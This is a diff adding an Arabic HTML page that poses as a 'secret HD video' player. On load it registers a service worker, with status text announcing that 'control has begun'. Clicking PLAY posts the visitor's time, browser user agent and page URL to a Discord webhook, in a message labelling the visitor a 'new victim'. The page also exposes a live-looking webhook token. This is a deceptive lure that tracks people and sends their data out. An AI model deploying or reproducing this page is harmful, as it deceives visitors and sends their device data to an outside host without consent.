@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فيديو HD سري</title>
+  <style>
+    body { margin: 0; background: black; height: 100vh; color: white; text-align: center; padding-top: 40vh; font-family: Arial; }
+    button { width: 180px; height: 180px; background: white; border-radius: 50%; font-size: 40px; cursor: pointer; box-shadow: 0 0 30px red; }
+  </style>
+</head>
+<body>
+  <h1>اضغط لتشغيل الفيديو السري HD</h1>
+  <button onclick="start()">PLAY</button>
+  <p id="status" style="font-size: 22px; margin-top: 30px;"></p>
+
+  <script>
+    // تسجيل Service Worker تلقائي
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('/sw.js')
+        .then(() => document.getElementById('status').innerText = 'السيطرة بدأت...')
+        .catch(() => document.getElementById('status').innerText = 'جاري التحميل...');
+    }
+
+    function start() {
+      document.getElementById('status').innerText = 'جاري التشغيل...';
+
+      // إرسال إشعار تلقائي للديسكورد فور الضغط
+      fetch('https://discord.com/api/webhooks/1460280189752836291/QOPlJU-JaZt44QRkjAR4E90vU4O2A5b2cPvY1Rar5W8kP9fjHNS9wz4rQQ-UuURV5EdF', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: 'ضحية جديدة ضغط على PLAY – السيطرة بدأت! 🫦\n' +
+                   'الوقت: ' + new Date().toLocaleString() + '\n' +
+                   'الجهاز: ' + navigator.userAgent + '\n' +
+                   'الرابط: ' + window.location.href
+        })
+      }).catch(() => {});
+
+      // هنا يمكن إضافة أي شيء آخر لاحقًا (لقطات، إلخ)
+    }
+  </script>
+</body>
+</html>
